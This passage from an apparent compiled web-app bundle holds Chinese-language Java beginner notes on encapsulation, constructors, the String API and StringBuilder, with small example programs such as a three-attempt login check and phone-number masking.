**生命周期不同：**成员变量（随着对象的存在而存在，随着对象的消失而消失）局部变量（随着方法的调用而存在，醉着方法的调用完毕而消失）\r\n* **初始化值不同：**成员变量（有默认初始化值）局部变量（没有默认初始化值，必须先定义，赋值才能使用）\r\n\r\n## 4. 封装\r\n\r\n### 4.1 private关键字\r\n\r\n​\t**概述 :** private是一个修饰符，可以用来修饰成员（成员变量，成员方法）\r\n\r\n​\t**特点 :** 被private修饰的成员，只能在本类进行访问，针对private修饰的成员变量，如果需要被其他类使用，\t提供相应的操作\r\n\r\n​\t\t提供“get变量名()”方法，用于获取成员变量的值，方法用public修饰\r\n\r\n​\t\t提供“set变量名(参数)”方法，用于设置成员变量的值，方法用public修饰\r\n\r\n​\t**示例代码：**\r\n\r\n```java\r\n/*\r\n    学生类\r\n */\r\nclass Student {\r\n    //成员变量\r\n    String name;\r\n    private int age;\r\n\r\n    //提供get/set方法\r\n    public void setAge(int a) {\r\n        if(a<0 || a>120) {\r\n            System.out.println("你给的年龄有误");\r\n        } else {\r\n            age = a;\r\n        }\r\n    }\r\n\r\n    public int getAge() {\r\n        return age;\r\n    }\r\n\r\n    //成员方法\r\n    public void show() {\r\n        System.out.println(name + "," + age);\r\n    }\r\n}\r\n/*\r\n    学生测试类\r\n */\r\npublic class StudentDemo {\r\n    public static void main(String[] args) {\r\n        //创建对象\r\n        Student s = new Student();\r\n        //给成员变量赋值\r\n        s.name = "林青霞";\r\n        s.setAge(30);\r\n        //调用show方法\r\n        s.show();\r\n    }\r\n}\r\n```\r\n### 4.2 private关键字的使用\r\n\r\n* **需求：**\r\n\r\n  * 定义标准的学生类，要求name和age使用private修饰\r\n  * 并提供set和get方法以及便于显示数据的show方法\r\n  * 测试类中创建对象并使用，最终控制台输出  林青霞，30 \r\n\r\n* **示例代码：**\r\n\r\n  ```java\r\n  /*\r\n      学生类\r\n   */\r\n  class Student {\r\n      //成员变量\r\n      private String name;\r\n      private int age;\r\n  \r\n      //get/set方法\r\n      public void setName(String n) {\r\n          name = n;\r\n      }\r\n  \r\n      public String getName() {\r\n          return name;\r\n      }\r\n  \r\n      public void setAge(int a) {\r\n          age = a;\r\n      }\r\n  \r\n      public int getAge() {\r\n          return age;\r\n      }\r\n  \r\n      public void show() {\r\n          System.out.println(name + "," + age);\r\n      }\r\n  }\r\n  /*\r\n      学生测试类\r\n   */\r\n  public class StudentDemo {\r\n      public static void main(String[] args) {\r\n          //创建对象\r\n          Student s = new Student();\r\n  \r\n          //使用set方法给成员变量赋值\r\n          s.setName("林青霞");\r\n          s.setAge(30);\r\n  \r\n          s.show();\r\n  \r\n          //使用get方法获取成员变量的值\r\n          System.out.println(s.getName() + "---" + s.getAge());\r\n          System.out.println(s.getName() + "," + s.getAge());\r\n  \r\n      }\r\n  }\r\n  ```\r\n\r\n### 4.3 this关键字【应用】\r\n\r\n**概述 :** this修饰的变量用于指代成员变量，其主要作用是（区分局部变量和成员变量的重名问题）\r\n* 方法的形参如果与成员变量同名，不带this修饰的变量指的是形参，而不是成员变量\r\n* 方法的形参没有与成员变量同名，不带this修饰的变量指的是成员变量\r\n\r\n**代码实现 :** \r\n\r\n```java\r\npublic class Student {\r\n    private String name;\r\n    private int age;\r\n\r\n    public void setName(String name) {\r\n        this.name = name;\r\n    }\r\n\r\n    public String getName() {\r\n        return name;\r\n    }\r\n\r\n    public void setAge(int age) {\r\n        this.age = age;\r\n    }\r\n\r\n    public int getAge() {\r\n        return age;\r\n    }\r\n\r\n    public void show() {\r\n        System.out.println(name + "," + age);\r\n    }\r\n}\r\n```\r\n\r\n### 4.4 this内存原理【理解】\r\n\r\n* **注意 :** this代表当前调用方法的引用，哪个对象调用的方法，this就代表哪一个对象\r\n\r\n* **图解 ：**\r\n\r\n* ![1590938942838](./img/java/basics/day07-面向对象.img/1590938942838.png)\r\n\r\n  ![1590938969305](./img/java/basics/day07-面向对象.img/1590938969305.png)\r\n\r\n### 4.5 封装思想\r\n\r\n1. **封装概述**\r\n    是面向对象三大特征之一（封装，继承，多态）\r\n    是面向对象编程语言对客观世界的模拟，客观世界里成员变量都是隐藏在对象内部的，外界是无法直接操作的\r\n2. **封装原则**\r\n    将类的某些信息隐藏在类内部，不允许外部程序直接访问，而是通过该类提供的方法来实现对隐藏信息的操作和访问\r\n    成员变量private，提供对应的getXxx()/setXxx()方法\r\n3. **封装好处**\r\n    通过方法来控制成员变量的操作，提高了代码的安全性\r\n    把代码用方法进行封装，提高了代码的复用性\r\n\r\n## 5. 构造方法\r\n\r\n### 5.1 构造方法的格式和执行时机\r\n\r\n* **格式注意 :**\r\n  *  方法名与类名相同，大小写也要一致\r\n  * 没有返回值类型，连void都没有\r\n  * 没有具体的返回值（不能由retrun带回结果数据）\r\n* **执行时机 ：**\r\n  * 创建对象的时候调用，每创建一次对象，就会执行一次构造方法\r\n  * 不能手动调用构造方法\r\n* **示例代码：**\r\n\r\n```java\r\nclass Student {\r\n    private String name;\r\n    private int age;\r\n\r\n    //构造方法\r\n    public Student() {\r\n        System.out.println("无参构造方法");\r\n    }\r\n\r\n    public void show() {\r\n        System.out.println(name + "," + age);\r\n    }\r\n}\r\n/*\r\n    测试类\r\n */\r\npublic class StudentDemo {\r\n    public static void main(String[] args) {\r\n        //创建对象\r\n        Student s = new Student();\r\n        s.show();\r\n    }\r\n}\r\n```\r\n\r\n### 5.2 构造方法的作用\r\n\r\n* 用于给对象的数据（属性）进行初始化\r\n\r\n```java\r\npackage com.itheima.constructor;\r\n\r\npublic class Student {\r\n    /*\r\n        格式:\r\n\r\n               1. 方法名需要跟类名相同, 大小写也要一致\r\n               2. 没有返回值类型, 连void都没有\r\n               3. 没有具体的返回值(不能由return带回具体的结果)\r\n     */\r\n\r\n    private String name;\r\n    private int age;\r\n\r\n    // 1. 如果一个类中没有编写任何构造方法, 系统将会提供一个默认的无参数构造方法\r\n    public Student(){}\r\n\r\n    // 2. 如果手动编写了构造方法, 系统就不会再提供默认的无参数构造方法了\r\n    public Student(String name, int age){\r\n        this.name = name;\r\n        this.age = age;\r\n        System.out.println("我是Student类的构造方法");\r\n    }\r\n\r\n    public void show(){\r\n        System.out.println(name + "..." + age);\r\n    }\r\n}\r\n```\r\n\r\n```java\r\npackage com.itheima.constructor;\r\n\r\npublic class TestStudent {\r\n    public static void main(String[] args) {\r\n        Student stu1 = new Student("张三",23);\r\n        stu1.show();\r\n\r\n        Student stu2 = new Student();\r\n    }\r\n}\r\n```\r\n\r\n\r\n\r\n### 5.3 构造方法的注意事项\r\n\r\n**构造方法的创建 :** \r\n\r\n​\t如果没有定义构造方法，系统将给出一个默认的无参数构造方法\r\n\r\n​\t如果定义了构造方法，系统将不再提供默认的构造方法\r\n\r\n**构造方法的创建 :** \r\n\r\n​\t如果没有定义构造方法，系统将给出一个默认的无参数构造方法如果定义了构造方法，系统将不再提供默认的构造方法\r\n\r\n**推荐的使用方式 :** \r\n\r\n​\t无论是否使用，都手动书写无参数构造方法，和带参数构造方法\r\n\r\n\r\n\r\n### 5.4 标准类的代码编写和使用\r\n\r\n**代码 :** \r\n\r\n```java\r\npackage com.itheima.test3;\r\n\r\n/*\r\n    JavaBean类: 封装数据\r\n */\r\npublic class Student {\r\n    private String name;\r\n    private int age;\r\n\r\n    public Student() {\r\n    }\r\n\r\n    public Student(String name, int age) {\r\n        this.name = name;\r\n        this.age = age;\r\n    }\r\n\r\n    public String getName() {\r\n        return name;\r\n    }\r\n\r\n    public void setName(String name) {\r\n        this.name = name;\r\n    }\r\n\r\n    public int getAge() {\r\n        return age;\r\n    }\r\n\r\n    public void setAge(int age) {\r\n        this.age = age;\r\n    }\r\n\r\n    public void show(){\r\n        System.out.println(name + "..." + age);\r\n    }\r\n}\r\n\r\n```\r\n\r\n```java\r\npackage com.itheima.test3;\r\n\r\npublic class TestStudent {\r\n    public static void main(String[] args) {\r\n        // 1. 无参数构造方法创建对象, 通过setXxx方法给成员变量进行赋值\r\n        Student stu1 = new Student();\r\n        stu1.setName("张三");\r\n        stu1.setAge(23);\r\n        stu1.show();\r\n\r\n        // 2. 通过带参数构造方法, 直接给属性进行赋值\r\n        Student stu2 = new Student("李四",24);\r\n        stu2.show();\r\n    }\r\n}\r\n\r\n```\r\n\r\n',M={data:function(){return{MainComponent:j}}},R=M,L=Object(u["a"])(R,k,C,!1,null,"8449ef60",null),O=L.exports,A=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},I=[],D='## 1.API\r\n\r\n### 1.1 API概述-帮助文档的使用\r\n\r\n- 什么是API\r\n\r\n  ​\tAPI (Application Programming Interface) ：应用程序编程接口\r\n\r\n- java中的API\r\n\r\n  ​\t指的就是 JDK 中提供的各种功能的 Java类，这些类将底层的实现封装了起来，我们不需要关心这些类是如何实现的，只需要学习这些类如何使用即可，我们可以通过帮助文档来学习这些API如何使用。\r\n\r\n**如何使用API帮助文档 :** \r\n\r\n- 打开帮助文档\r\n\r\n- 找到索引选项卡中的输入框\r\n\r\n- 在输入框中输入Random\r\n\r\n- 看类在哪个包下\r\n\r\n- 看类的描述\r\n\r\n- 看构造方法\r\n\r\n- 看成员方法\r\n\r\n\r\n\r\n### 1.2 键盘录入字符串\r\n\r\n**Scanner类 :**\r\n\r\n​\tnext() : 遇到了空格, 就不再录入数据了 , 结束标记: 空格, tab键\r\n\r\n​\tnextLine() : 可以将数据完整的接收过来 , 结束标记: 回车换行符       \r\n\r\n**代码实现 :** \r\n\r\n```java\r\npackage com.itheima.api;\r\n\r\nimport java.util.Scanner;\r\n\r\npublic class Demo1Scanner {\r\n    /*\r\n        next() : 遇到了空格, 就不再录入数据了\r\n\r\n                结束标记: 空格, tab键\r\n\r\n        nextLine() : 可以将数据完整的接收过来\r\n\r\n                结束标记: 回车换行符\r\n     */\r\n    public static void main(String[] args) {\r\n        // 1. 创建Scanner对象\r\n        Scanner sc = new Scanner(System.in);\r\n        System.out.println("请输入:");\r\n        // 2. 调用nextLine方法接收字符串\r\n        // ctrl + alt + v : 快速生成方法的返回值\r\n        String s = sc.nextLine();\r\n\r\n        System.out.println(s);\r\n    }\r\n}\r\n\r\n```\r\n\r\n```java\r\npackage com.itheima.api;\r\n\r\nimport java.util.Scanner;\r\n\r\npublic class Demo2Scanner {\r\n    /*\r\n        nextInt和nextLine方法配合使用的时候, nextLine方法就没有键盘录入的机会了\r\n\r\n        建议: 今后键盘录入数据的时候, 如果是字符串和整数一起接受, 建议使用next方法接受字符串.\r\n     */\r\n    public static void main(String[] args) {\r\n        Scanner sc = new Scanner(System.in);\r\n        System.out.println("请输入整数:");\r\n        int num = sc.nextInt(); // 10 + 回车换行\r\n        System.out.println("请输入字符串:");\r\n        String s = sc.nextLine();\r\n\r\n\r\n        System.out.println(num);\r\n        System.out.println(s);\r\n    }\r\n}\r\n```\r\n\r\n\r\n\r\n## 2. String类\r\n\r\n### 2.1 String概述\r\n\r\n​\t1 String 类在 java.lang 包下，所以使用的时候不需要导包\r\n\r\n​\t2 String 类代表字符串，Java 程序中的所有字符串文字（例如“abc”）都被实现为此类的实例也就是说，Java 程序中所有的双引号字符串，都是 String 类的对象\r\n\r\n​\t3 字符串不可变，它们的值在创建后不能被更改\r\n\r\n### 2.2 String类的构造方法\r\n\r\n**常用的构造方法**\r\n\r\n![1590939947722](./img/java/basics/day08-常用API.img/1590939947722.png)\r\n\r\n**示例代码**\r\n\r\n```java\r\npackage com.itheima.string;\r\n\r\npublic class Demo2StringConstructor {\r\n    /*\r\n        String类常见构造方法:\r\n\r\n            public String() : 创建一个空白字符串对象，不含有任何内容\r\n            public String(char[] chs) : 根据字符数组的内容，来创建字符串对象\r\n            public String(String original) : 根据传入的字符串内容，来创建字符串对象\r\n            String s = “abc”;  直接赋值的方式创建字符串对象，内容就是abc\r\n\r\n         注意:\r\n                String这个类比较特殊, 打印其对象名的时候, 不会出现内存地址\r\n                而是该对象所记录的真实内容.\r\n\r\n                面向对象-继承, Object类\r\n     */\r\n    public static void main(String[] args) {\r\n        // public String() : 创建一个空白字符串对象，不含有任何内容\r\n        String s1 = new String();\r\n        System.out.println(s1);\r\n\r\n        // public String(char[] chs) : 根据字符数组的内容，来创建字符串对象\r\n        char[] chs = {\'a\',\'b\',\'c\'};\r\n        String s2 = new String(chs);\r\n        System.out.println(s2);\r\n\r\n        // public String(String original) : 根据传入的字符串内容，来创建字符串对象\r\n        String s3 = new String("123");\r\n        System.out.println(s3);\r\n    }\r\n}\r\n```\r\n### 2.4 创建字符串对象的区别对比\r\n\r\n- **通过构造方法创建**\r\n\r\n  ​\t通过 new 创建的字符串对象，每一次 new 都会申请一个内存空间，虽然内容相同，但是地址值不同\r\n\r\n- **直接赋值方式创建**\r\n\r\n  ​\t以“”方式给出的字符串，只要字符序列相同(顺序和大小写)，无论在程序代码中出现几次，JVM 都只会建立一个 String 对象，并在字符串池中维护\r\n\r\n### 2.5 字符串的比较 \r\n\r\n#### 2.5.1 字符串的比较\r\n\r\n- == 比较基本数据类型：比较的是具体的值\r\n- == 比较引用数据类型：比较的是对象地址值\r\n\r\n**String类 :  public boolean equals(String s)     比较两个字符串内容是否相同、区分大小写**\r\n\r\n**代码 :**\r\n\r\n```java\r\npackage com.itheima.stringmethod;\r\n\r\npublic class Demo1Equals {\r\n    public static void main(String[] args) {\r\n        String s1 = "abc";\r\n        String s2 = "ABC";\r\n        String s3 = "abc";\r\n\r\n        // equals : 比较字符串内容, 区分大小写\r\n        System.out.println(s1.equals(s2));\r\n        System.out.println(s1.equals(s3));\r\n\r\n        // equalsIgnoreCase : 比较字符串内容, 忽略大小写\r\n        System.out.println(s1.equalsIgnoreCase(s2));\r\n    }\r\n}\r\n\r\n```\r\n\r\n### 2.6 用户登录案例【应用】\r\n\r\n**案例需求 :** \r\n\r\n​\t已知用户名和密码，请用程序实现模拟用户登录。总共给三次机会，登录之后，给出相应的提示\r\n\r\n**实现步骤 : **\r\n\r\n1. 已知用户名和密码，定义两个字符串表示即可\r\n2. 键盘录入要登录的用户名和密码，用 Scanner 实现\r\n3. 拿键盘录入的用户名、密码和已知的用户名、密码进行比较，给出相应的提示。\r\n4. 字符串的内容比较，用equals() 方法实现\r\n5. 用循环实现多次机会，这里的次数明确，采用for循环实现，并在登录成功的时候，使用break结束循\r\n\r\n**代码实现 :** \r\n\r\n```java\r\npackage com.itheima.test;\r\n\r\nimport java.util.Scanner;\r\n\r\npublic class Test1 {\r\n    /*\r\n        需求：已知用户名和密码，请用程序实现模拟用户登录。\r\n              总共给三次机会，登录之后，给出相应的提示\r\n\r\n        思路：\r\n        1. 已知用户名和密码，定义两个字符串表示即可\r\n        2. 键盘录入要登录的用户名和密码，用 Scanner 实现\r\n        3. 拿键盘录入的用户名、密码和已知的用户名、密码进行比较，给出相应的提示。\r\n            字符串的内容比较，用equals() 方法实现\r\n        4. 用循环实现多次机会，这里的次数明确，采用for循环实现，并在登录成功的时候，使用break结束循环\r\n\r\n     */\r\n    public static void main(String[] args) {\r\n        // 1. 已知用户名和密码，定义两个字符串表示即可\r\n        String username = "admin";\r\n        String password = "123456";\r\n        // 2. 键盘录入要登录的用户名和密码，用 Scanner 实现\r\n        Scanner sc = new Scanner(System.in);\r\n        // 4. 用循环实现多次机会，这里的次数明确，采用for循环实现\r\n        for(int i = 1; i <= 3; i++){\r\n            System.out.println("请输入用户名:");\r\n            String scUsername = sc.nextLine();\r\n            System.out.println("请输入密码:");\r\n            String scPassword = sc.nextLine();\r\n            // 3. 拿键盘录入的用户名、密码和已知的用户名、密码进行比较，给出相应的提示。\r\n            if(username.equals(scUsername) && password.equals(scPassword)){\r\n                System.out.println("登录成功");\r\n                break;\r\n            }else{\r\n                if(i == 3){\r\n                    System.out.println("您的登录次数已达到今日上限, 请明天再来");\r\n                }else{\r\n                    System.out.println("登录失败,您还剩余" + (3-i) +"次机会");\r\n                }\r\n\r\n            }\r\n        }\r\n\r\n    }\r\n}\r\n```\r\n\r\n### 2.7 遍历字符串案例【应用】\r\n\r\n**案例需求 :** \r\n\r\n​\t键盘录入一个字符串，使用程序实现在控制台遍历该字符串\r\n\r\n**实现步骤 :** \r\n\r\n1. 键盘录入一个字符串，用 Scanner 实现\r\n2. 遍历字符串，首先要能够获取到字符串中的每一个字符, public char charAt(int index)：返回指定索引处的char值，字符串的索引也是从0开始的\r\n3.  遍历字符串，其次要能够获取到字符串的长度,   public int length()：返回此字符串的长度\r\n4. 遍历打印\r\n\r\n**代码实现 :** \r\n\r\n```java\r\npackage com.itheima.test;\r\n\r\nimport java.util.Scanner;\r\n\r\npublic class Test2 {\r\n    /*\r\n        需求：键盘录入一个字符串，使用程序实现在控制台遍历该字符串\r\n\r\n        思路：\r\n        1. 键盘录入一个字符串，用 Scanner 实现\r\n        2. 遍历字符串，首先要能够获取到字符串中的每一个字符\r\n            public char charAt(int index)：返回指定索引处的char值，字符串的索引也是从0开始的\r\n        3. 遍历字符串，其次要能够获取到字符串的长度\r\n            public int length()：返回此字符串的长度\r\n        4. 遍历打印\r\n9\r\n     */\r\n    public static void main(String[] args) {\r\n        //  1. 键盘录入一个字符串，用 Scanner 实现\r\n        Scanner sc = new Scanner(System.in);\r\n        System.out.println("请输入:");\r\n        String s = sc.nextLine();\r\n        // 2. 遍历字符串，首先要能够获取到字符串中的每一个字符\r\n        for(int i = 0; i < s.length(); i++){\r\n            // i : 字符串的每一个索引\r\n            char c = s.charAt(i);\r\n            System.out.println(c);\r\n        }\r\n    }\r\n}\r\n```\r\n\r\n### 2.8 统计字符次数案例【应用】\r\n\r\n**案例需求 :** \r\n\r\n​\t键盘录入一个字符串，使用程序实现在控制台遍历该字符串\r\n\r\n**实现步骤 :** \r\n\r\n1. 键盘录入一个字符串，用 Scanner 实现\r\n2. 将字符串拆分为字符数组 , public char[] toCharArray( )：将当前字符串拆分为字符数组并返回\r\n3. 遍历字符数\r\n\r\n**代码实现 :** \r\n\r\n```java\r\npackage com.itheima.test;\r\n\r\nimport java.util.Scanner;\r\n\r\npublic class Test3 {\r\n    /*\r\n       需求：键盘录入一个字符串，使用程序实现在控制台遍历该字符串\r\n\r\n       思路：\r\n       1. 键盘录入一个字符串，用 Scanner 实现\r\n       2. 将字符串拆分为字符数组\r\n                public char[] toCharArray( )：将当前字符串拆分为字符数组并返回\r\n       3. 遍历字符数组\r\n\r\n    */\r\n    public static void main(String[] args) {\r\n        //  1. 键盘录入一个字符串，用 Scanner 实现\r\n        Scanner sc = new Scanner(System.in);\r\n        System.out.println("请输入:");\r\n        String s = sc.nextLine();\r\n        // 2. 将字符串拆分为字符数组\r\n        char[] chars = s.toCharArray();\r\n        // 3. 遍历字符数组\r\n        for (int i = 0; i < chars.length; i++) {\r\n            System.out.println(chars[i]);\r\n        }\r\n    }\r\n}\r\n```\r\n\r\n### 2.9 手机号屏蔽-字符串截取\r\n\r\n**案例需求 :** \r\n\r\n​\t以字符串的形式从键盘接受一个手机号，将中间四位号码屏蔽\r\n        最终效果为：156****1234\r\n\r\n**实现步骤 :** \r\n\r\n1. 键盘录入一个字符串，用 Scanner 实现\r\n2. 截取字符串前三位\r\n3. 截取字符串后四位\r\n4. 将截取后的两个字符串，中间加上****进行拼接，输出结果\r\n\r\n**代码实现 :** \r\n\r\n```java\r\npackage com.itheima.test;\r\n\r\nimport java.util.Scanner;\r\n\r\npublic class Test5 {\r\n    /*\r\n        需求：以字符串的形式从键盘接受一个手机号，将中间四位号码屏蔽\r\n        最终效果为：156****1234\r\n\r\n        思路：\r\n        1. 键盘录入一个字符串，用 Scanner 实现\r\n        2. 截取字符串前三位\r\n        3. 截取字符串后四位\r\n        4. 将截取后的两个字符串，中间加上****进行拼接，输出结果\r\n\r\n     */\r\n    public static void main(String[] args) {\r\n        // 1. 键盘录入一个字符串，用 Scanner 实现\r\n        Scanner sc = new Scanner(System.in);\r\n        System.out.println("请输入手机号:");\r\n        String telString = sc.nextLine();\r\n        // 2. 截取字符串前三位\r\n        String start = telString.substring(0,3);\r\n        // 3. 截取字符串后四位\r\n        String end = telString.substring(7);\r\n        // 4. 将截取后的两个字符串，中间加上****进行拼接，输出结果\r\n        System.out.println(start + "****" + end);\r\n    }\r\n}\r\n```\r\n\r\n### 2.10 敏感词替换-字符串替换\r\n\r\n**案例需求 :** \r\n\r\n​\t键盘录入一个 字符串，如果字符串中包含（TMD），则使用***替换\r\n\r\n**实现步骤 :** \r\n\r\n1. 键盘录入一个字符串，用 Scanner 实现\r\n2. 替换敏感词\r\n               String replace(CharSequence target, CharSequence replacement)\r\n               将当前字符串中的target内容，使用replacement进行替换，返回新的字符串\r\n3. 输出结果\r\n\r\n**代码实现 :** \r\n\r\n```java\r\npackage com.itheima.test;\r\n\r\nimport java.util.Scanner;\r\n\r\npublic class Test6 {\r\n    /*\r\n        需求：键盘录入一个 字符串，如果字符串中包含（TMD），则使用***替换\r\n\r\n        思路：\r\n        1. 键盘录入一个字符串，用 Scanner 实现\r\n        2. 替换敏感词\r\n                String replace(CharSequence target, CharSequence replacement)\r\n                将当前字符串中的target内容，使用replacement进行替换，返回新的字符串\r\n        3. 输出结果\r\n\r\n     */\r\n    public static void main(String[] args) {\r\n        // 1. 键盘录入一个字符串，用 Scanner 实现\r\n        Scanner sc = new Scanner(System.in);\r\n        System.out.println("请输入:");\r\n        String s = sc.nextLine();\r\n        // 2. 替换敏感词\r\n        String result = s.replace("TMD","***");\r\n        // 3. 输出结果\r\n        System.out.println(result);\r\n    }\r\n}\r\n```\r\n\r\n### 2.11 切割字符串\r\n\r\n**案例需求 :** \r\n\r\n​\t以字符串的形式从键盘录入学生信息，例如：“张三 , 23”\r\n\r\n​\t从该字符串中切割出有效数据,封装为Student学生对象\r\n\r\n**实现步骤 :** \r\n\r\n1. 编写Student类，用于封装数据\r\n\r\n2. 键盘录入一个字符串，用 Scanner 实现\r\n\r\n3. 根据逗号切割字符串，得到（张三）（23）\r\n\r\n   String[] split(String regex) ：根据传入的字符串作为规则进行切割\r\n   将切割后的内容存入字符串数组中，并将字符串数组返回\r\n\r\n4. 从得到的字符串数组中取出元素内容，通过Student类的有参构造方法封装为对象\r\n\r\n5. 调用对象getXxx方法，取出数据并打印。\r\n\r\n**代码实现 :** \r\n\r\n```java\r\npackage com.itheima.test;\r\n\r\nimport com.itheima.domain.Student;\r\n\r\nimport java.util.Scanner;\r\n\r\npublic class Test7 {\r\n    /*\r\n         需求：以字符串的形式从键盘录入学生信息，例如：“张三 , 23”\r\n                从该字符串中切割出有效数据,封装为Student学生对象\r\n         思路：\r\n            1. 编写Student类，用于封装数据\r\n            2. 键盘录入一个字符串，用 Scanner 实现\r\n            3. 根据逗号切割字符串，得到（张三）（23）\r\n                    String[] split(String regex) ：根据传入的字符串作为规则进行切割\r\n                    将切割后的内容存入字符串数组中，并将字符串数组返回\r\n            4. 从得到的字符串数组中取出元素内容，通过Student类的有参构造方法封装为对象\r\n            5. 调用对象getXxx方法，取出数据并打印。\r\n\r\n     */\r\n    public static void main(String[] args) {\r\n        // 2. 键盘录入一个字符串，用 Scanner 实现\r\n        Scanner sc = new Scanner(System.in);\r\n        System.out.println("请输入学生信息:");\r\n        String stuInfo = sc.nextLine();\r\n        // stuInfo = "张三,23";\r\n        // 3. 根据逗号切割字符串，得到（张三）（23）\r\n        String[] sArr = stuInfo.split(",");\r\n\r\n//        System.out.println(sArr[0]);\r\n//        System.out.println(sArr[1]);\r\n\r\n        // 4. 从得到的字符串数组中取出元素内容，通过Student类的有参构造方法封装为对象\r\n        Student stu = new Student(sArr[0],sArr[1]);\r\n\r\n        // 5. 调用对象getXxx方法，取出数据并打印。\r\n        System.out.println(stu.getName() + "..." + stu.getAge());\r\n    }\r\n}\r\n```\r\n\r\n### 2.12 String方法小结\r\n\r\n**String类的常用方法 :** \r\n\r\n​\tpublic boolean equals(Object anObject)  比较字符串的内容，严格区分大小写\r\n\r\n​\tpublic boolean equalsIgnoreCase(String anotherString)  比较字符串的内容，忽略大小写\r\n\r\n​\tpublic int length()  返回此字符串的长度\r\n\r\n​\tpublic char charAt(int index)  返回指定索引处的 char 值\r\n\r\n​\tpublic char[] toCharArray()  将字符串拆分为字符数组后返回\r\n\r\n​\tpublic String substring(int beginIndex, int endIndex)  根据开始和结束索引进行截取，得到新的字符串（包含头，不包含尾）\r\n\r\n​\tpublic String substring(int beginIndex)  从传入的索引处截取，截取到末尾，得到新的字符串\r\n\r\n​\tpublic String replace(CharSequence target, CharSequence replacement)  使用新值，将字符串中的旧值替换，得到新的字符串\r\n\r\n​\tpublic String[] split(String regex)  根据传入的规则切割字符串，得到字符串数组\r\n\r\n## 3 StringBuilder类\r\n\r\n### 3.1 StringBuilder类概述\r\n\r\n​\t**概述 :** StringBuilder 是一个可变的字符串类，我们可以把它看成是一个容器，这里的可变指的是 StringBuilder 对象中的内容是可变的\r\n\r\n### 3.2 StringBuilder类和String类的区别\r\n\r\n- **String类：**内容是不可变的\r\n- **StringBuilder类：**内容是可变的\r\n\r\n### 3.3StringBuilder类的构造方法\r\n\r\n**常用的构造方法**\r\n\r\n| 方法名                             | 说明                                       |\r\n| ---------------------------------- | ------------------------------------------ |\r\n| public StringBuilder()             | 创建一个空白可变字符串对象，不含有任何内容 |\r\n| public StringBuilder(String   str) | 根据字符串的内容，来创建可变字符串对象     |\r\n\r\n**示例代码**\r\n\r\n```java\r\npublic class StringBuilderDemo01 {\r\n    public static void main(String[] args) {\r\n        //public StringBuilder()：创建一个空白可变字符串对象，不含有任何内容\r\n        StringBuilder sb = new StringBuilder();\r\n        System.out.println("sb:" + sb);\r\n        System.out.println("sb.length():" + sb.length());\r\n\r\n        //public StringBuilder(String str)：根据字符串的内容，来创建可变字符串对象\r\n        StringBuilder sb2 = new StringBuilder("hello");\r\n        System.out.println("sb2:" + sb2);\r\n        System.out.println("sb2.length():" + sb2.length());\r\n    }\r\n}\r\n```\r\n\r\n### 3.4 StringBuilder常用的成员方法\r\n\r\n- **添加和反转方法**\r\n\r\n  | 方法名                                  | 说明                     |\r\n  | --------------------------------------- | ------------------------ |\r\n  | public StringBuilder   append(任意类型) | 添加数据，并返回对象本身 |\r\n  | public StringBuilder   reverse()        | 返回相反的字符序列       |\r\n\r\n- **示例代码**\r\n\r\n```java\r\npublic class StringBuilderDemo01 {\r\n    public static void main(String[] args) {\r\n        //创建对象\r\n        StringBuilder sb = new StringBuilder();\r\n\r\n        //public StringBuilder append(任意类型)：添加数据，并返回对象本身\r\n//        StringBuilder sb2 = sb.append("hello");\r\n//\r\n//        System.out.println("sb:" + sb);\r\n//        System.out.println("sb2:" + sb2);\r\n//        System.out.println(sb == sb2);\r\n\r\n//        sb.append("hello");\r\n//        sb.append("world");\r\n//        sb.append("java");\r\n//        sb.append(100);\r\n\r\n        //链式编程\r\n        sb.append("hello").append("world").append("java").append(100);\r\n\r\n        System.out.println("sb:" + sb);\r\n\r\n        //public StringBuilder reverse()：返回相反的字符序列\r\n        sb.reverse();\r\n        System.out.println("sb:" + sb);\r\n    }\r\n}\r\n```\r\n\r\n### 3.5StringBuilder和String相互转换【应用】\r\n\r\n- **StringBuilder转换为String**\r\n\r\n  ​        public String toString()：通过 toString() 就可以实现把 StringBuilder 转换为 String\r\n\r\n- **String转换为StringBuilder**\r\n\r\n  ​        public StringBuilder(String s)：通过构造方法就可以实现把 String 转换为 StringBuilder\r\n\r\n- **示例代码**\r\n\r\n```java\r\npublic class StringBuilderDemo02 {\r\n    public static void main(String[] args) {\r\n        /*\r\n        //StringBuilder 转换为 String\r\n        StringBuilder sb = new StringBuilder();\r\n        sb.append("hello");\r\n\r\n        //String s = sb; //这个是错误的做法\r\n\r\n        //public String toString()：通过 toString() 就可以实现把 StringBuilder 转换为 String\r\n        String s = sb.toString();\r\n        System.out.println(s);\r\n        */\r\n\r\n        //String 转换为 StringBuilder\r\n        String s = "hello";\r\n\r\n        //StringBuilder sb = s; //这个是错误的做法\r\n\r\n        //public StringBuilder(String s)：通过构造方法就可以实现把 String 转换为 StringBuilder\r\n        StringBuilder sb = new StringBuilder(s);\r\n\r\n        System.out.println(sb);\r\n    }\r\n}\r\n```\r\n\r\n### 3.6 StringBuilder拼接字符串案例\r\n\r\n**案例需求 :** \r\n\r\n​\t定义一个方法，把 int 数组中的数据按照指定的格式拼接成一个字符串返回，调用该方法，\r\n\r\n​\t并在控制台输出结果。例如，数组为int[] arr = {1,2,3}; ，执行方法后的输出结果为：[1, 2, 3]\r\n\r\n**实现步骤 :** \r\n\r\n1. 定义一个 int 类型的数组，用静态初始化完成数组元素的初始化\r\n2. 定义一个方法，用于把 int 数组中的数据按照指定格式拼接成一个字符串返回。\r\n             返回值类型 String，参数列表 int[] arr\r\n3. 在方法中用 StringBuilder 按照要求进行拼接，并把结果转成 String 返回\r\n4. 调用方法，用一个变量接收结果\r\n5. 输出结果\r\n\r\n**代码实现 :** \r\n\r\n```java\r\n/*\r\n    思路：\r\n        1:定义一个 int 类型的数组，用静态初始化完成数组元素的初始化\r\n        2:定义一个方法，用于把 int 数组中的数据按照指定格式拼接成一个字符串返回。\r\n          返回值类型 String，参数列表 int[] arr\r\n        3:在方法中用 StringBuilder 按照要求进行拼接，并把结果转成 String 返回\r\n        4:调用方法，用一个变量接收结果\r\n        5:输出结果\r\n */\r\npublic class StringBuilderTest01 {\r\n    public static void main(String[] args) {\r\n        //定义一个 int 类型的数组，用静态初始化完成数组元素的初始化\r\n        int[] arr = {1, 2, 3};\r\n\r\n        //调用方法，用一个变量接收结果\r\n        String s = arrayToString(arr);\r\n\r\n        //输出结果\r\n        System.out.println("s:" + s);\r\n\r\n    }\r\n\r\n    //定义一个方法，用于把 int 数组中的数据按照指定格式拼接成一个字符串返回\r\n    /*\r\n        两个明确：\r\n            